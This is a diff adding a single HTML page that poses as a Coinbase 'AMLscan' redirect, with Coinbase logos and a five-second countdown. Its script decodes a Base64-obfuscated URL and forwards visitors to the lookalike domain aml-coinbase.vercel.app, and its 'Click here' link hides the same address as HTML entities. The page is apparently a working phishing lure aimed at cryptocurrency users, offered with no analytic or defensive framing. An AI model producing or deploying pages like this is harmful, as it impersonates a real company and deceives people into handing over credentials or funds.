@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <link rel="icon" href="https://altcoinsbox.com/wp-content/uploads/2022/12/coinbase-logo.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: #000;
+            font-family: "Inter", serif;
+        }
+        /* Logo Container */
+        .logo-container {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            display: flex;
+            align-items: center;
+        }
+        /* Gray line beneath the logo */
+        .gray-line {
+            height: 1px;
+            background-color: #d0d0d0;
+            width: 100%;
+            position: absolute;
+            top: 40px; /* Positioned just below the logo */
+        }
+        h1 {
+            font-weight: 500;
+            font-size: 2.5em;
+            margin: 20px 0 0;
+        }
+        a {
+            color: #0052FF;
+            font-weight: 500;
+            text-decoration: none;
+            border-bottom: 1px solid #0052FF;
+            transition: 0.3s;
+        }
+        a:hover {
+            color: #003d99; /* Change color on hover */
+        }
+        .slider {
+            position: relative;
+            width: 400px;
+            margin: 20px 0;
+        }
+        .line {
+            position: absolute;
+            background: #0052FF;
+            width: 100%;
+            height: 2px;
+        }
+        .break {
+            position: absolute;
+            background: #ffffff;
+            width: 6px;
+            height: 2px;
+        }
+        .dot1, .dot2, .dot3 {
+            position: absolute;
+            background: #fff; /* Color of loading dots */
+            width: 6px;
+            height: 6px;
+            border-radius: 10%;
+            animation: loading 2s infinite;
+        }
+        .dot2 {
+            animation-delay: 0.5s;
+        }
+        .dot3 {
+            animation-delay: 1s;
+        }
+        @keyframes loading {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(400px); }
+        }
+        p {
+            margin-top: 10px;
+            font-size: 1.2em;
+            padding: 20px;
+        }
+        #countdown {
+            font-weight: 600;
+            color: #0052FF; /* Countdown color */
+        }
+    </style>
+    <script>
+        let encodedLink = "aHR0cHM6Ly9hbWwtY29pbmJhc2UudmVyY2VsLmFwcA=="; // Base64 encoded URL
+        let countdown = 5; // countdown time in seconds
+
+        function updateCountdown() {
+            if (countdown === 0) {
+                let decodedLink = atob(encodedLink); // Decode the Base64 string
+                window.location.href = decodedLink; // Redirect to the original URL
+            } else {
+                document.getElementById('countdown').innerText = countdown;
+                countdown--;
+            }
+        }
+        setInterval(updateCountdown, 1000); // update every second
+    </script>
+</head>
+<body>
+    <div class="logo-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Coinbase.svg/2560px-Coinbase.svg.png" alt="Coinbase Logo" width="100" height="auto">
+    </div>
+    <div class="gray-line"></div>
+    <h1>Just a Moment...</h1>
+    <img width="150" height="auto" src="images/6cbcf2d8ea6b584bc70b6fcf51b58196-Coinbase_Security_Shield.gif">
+    <p>We're redirecting you to our AMLscan site... Not working? <a href="&#x68;&#x74;&#x74;&#x70;&#x73;&#x3A;&#x2F;&#x2F;&#x61;&#x6D;&#x6C;&#x2D;&#x63;&#x6F;&#x69;&#x6E;&#x62;&#x61;&#x73;&#x65;&#x2E;&#x76;&#x65;&#x72;&#x63;&#x65;&#x6C;&#x2E;&#x61;&#x70;&#x70;">Click here.</a></p>
+    <p>Redirecting in <span id="countdown">5</span> seconds...</p>
+</body>
+</html>
